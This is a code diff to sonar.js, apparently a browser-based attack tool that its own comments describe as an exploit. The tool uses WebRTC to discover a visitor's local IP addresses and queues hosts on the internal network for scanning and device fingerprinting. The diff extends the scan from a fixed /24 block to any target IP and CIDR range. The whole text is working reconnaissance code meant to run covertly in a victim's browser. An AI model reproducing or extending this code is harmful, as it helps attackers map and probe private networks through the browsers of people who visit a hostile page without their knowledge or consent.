@@ -8,7 +8,7 @@ var sonar = {
     /*
      * Start the exploit
      */
-    'start': function(debug, interval_scan) {
+    'start': function(debug, interval_scan, target) {
         if( debug !== undefined ) {
           sonar.debug = true;
         }
@@ -17,7 +17,23 @@ var sonar = {
             interval_scan = 1000;
         }
 
+        if( target === undefined ) {
+            target = "/24";
+        }
+
         if( sonar.fingerprints.length == 0 ) {
+            return false;
+        }
+
+        // Separate IP and range, target[0] is the IP and target[1] is the range
+        // If the range is not specified, we assume that only one IP should be scaned
+        target = target.split( '/' );
+        if( target[1] === undefined ) {
+            target[1] = 32;
+        }
+
+        // Check the specified IP range, /31 subnets are excluded because those only have reserved and broadcast addresses
+        if( target[1] < 0 || target[1] > 32 || target[1] == 31 ) {
             return false;
         }
 
@@ -26,7 +42,11 @@ var sonar = {
             sonar.process_queue();
         }, interval_scan );
 
-        sonar.enumerate_local_ips();
+        if( target[0] == "" ) {
+            sonar.enumerate_local_ips( target[1] );
+        } else{
+            sonar.ip_to_range( target[0], target[1] );
+        }
     },
 
     /*
@@ -111,15 +131,63 @@ var sonar = {
         sonar.fingerprints = fingerprints;
     },
 
-    'ip_to_range': function( ip ) {
+    'ip_to_range': function(ip, range) {
         var ip_parts = ip.split( '.' );
         if( ip_parts.length !== 4 ) {
             return false;
         }
 
-        for( var i = 1; i < 255; i++ ) {
-            var tmp_ip = ip_parts[0] + '.' + ip_parts[1] + '.' + ip_parts[2] + '.' + i;
-            sonar.ip_queue.push( tmp_ip );
+        // If we're only going to scan one IP, queue it without calculating the range
+        if ( range == 32 ){
+            sonar.ip_queue.push( ip );
+            return;
+        }
+
+        var ip_min = [0, 0, 0, 0];
+        var ip_max = [0, 0, 0, 0];
+        var r = 0;
+
+        for( var tmp = 0; tmp < 4; tmp++ ) {
+
+            // Calculate the number of bits that change of the current part
+            if ( range > 8 + 8 * tmp){
+                r = 0;
+            } else {
+                r = 8 - (range - tmp * 8);
+            }
+
+            // Calculate minimum and maximum of IP range for the current part
+            ip_min[tmp] = ip_parts[tmp] & (255 << r);
+            ip_max[tmp] = ip_parts[tmp] | (255 & ~(255 << r));
+        }
+
+        if( sonar.debug ) {
+            alert( '[DEBUG][The samallest IP adress to be scaned is:]' + ip_min[0] + '.' + ip_min[1] + '.' + ip_min[2] + '.' + (ip_min[3] + 1));
+            alert( '[DEBUG][The largest IP adress to be scaned is:]' + ip_max[0] + '.' + ip_max[1] + '.' + ip_max[2] + '.' + (ip_max[3] - 1));
+        }
+
+        // Queue IP address range
+        ip_parts[3] = ip_min[3] + 1;
+        for( ip_parts[0] = ip_min[0]; ip_parts[0] <= ip_max[0]; ip_parts[0]++ ) {
+            if ( ip_parts[0] == ip_max[0] ){ // Check if we are approaching the end of the subnet
+                var ae = 1;
+            }
+            for( ip_parts[1] = ip_min[1]; ip_parts[1] <= ip_max[1]; ip_parts[1]++ ) {
+                if ( ae == 1 && ip_parts[1] == ip_max[1] ){
+                    var be = 1;
+                }
+                for( ip_parts[2] = ip_min[2]; ip_parts[2] <= ip_max[2]; ip_parts[2]++ ) {
+                    if ( be == 1 && ip_parts[2] == ip_max[2] ){
+                        ip_max[3]--; // Prevent the broadcast address from getting queued
+                    }
+                    while( ip_parts[3] <= ip_max[3] ) {
+                        var tmp_ip = ip_parts[0] + '.' + ip_parts[1] + '.' + ip_parts[2] + '.' + ip_parts[3];
+                        sonar.ip_queue.push( tmp_ip );
+                        ip_parts[3]++;
+                    }
+                    ip_parts[3] = ip_min[3];
+                }
+            }
         }
     },
 
@@ -175,7 +243,7 @@ var sonar = {
         //console.log( 'Dead IP', ip );
     },
 
-    'enumerate_local_ips': function() {
+    'enumerate_local_ips': function(range) {
         var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
         if (!RTCPeerConnection) return false;
         var addrs = Object.create(null);
@@ -183,7 +251,7 @@ var sonar = {
         function addAddress(newAddr) {
             if (newAddr in addrs) return;
             addrs[newAddr] = true;
-            sonar.ip_to_range(newAddr);
+            sonar.ip_to_range(newAddr, range);
         }
         function grepSDP(sdp) {
             var hosts = [];
